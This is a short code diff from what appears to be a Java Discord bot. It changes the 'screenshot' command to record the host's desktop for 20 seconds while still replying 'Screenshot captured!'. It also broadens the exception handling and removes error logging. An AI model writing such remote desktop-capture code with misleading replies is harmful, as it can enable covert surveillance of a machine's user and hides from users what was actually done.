@@ -156,11 +156,10 @@ public class Main {
                             case "screenshot":
                                 // Take a screenshot
                                 try {
-                                    Graphic.takeScreenshot(user);
+                                    Graphic.recordDesktop(user, 20);
                                     // Respond to the interaction indicating success
                                     return event.reply("Screenshot captured!").then();
-                                } catch (AWTException | IOException e) {
-                                    e.printStackTrace();
+                                } catch (Exception e) {
                                     // Respond to the interaction indicating failure
                                     return event.reply("Failed to capture screenshot.").then();
                                 }
